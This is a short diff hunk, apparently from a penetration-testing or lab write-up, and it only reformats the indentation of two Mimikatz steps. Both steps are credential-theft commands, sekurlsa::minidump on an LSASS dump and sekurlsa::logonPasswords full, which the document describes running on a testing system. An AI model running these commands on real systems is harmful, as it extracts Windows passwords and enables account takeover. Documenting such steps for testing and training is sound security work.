@@ -12,6 +12,6 @@
 
  - On our testing system, we open a privileged powershell or CMD session and run Mimikatz
 
- - sekurlsa::minidump lsass.dmp
+       sekurlsa::minidump lsass.dmp
 
- - sekurlsa::logonPasswords full
+       sekurlsa::logonPasswords full
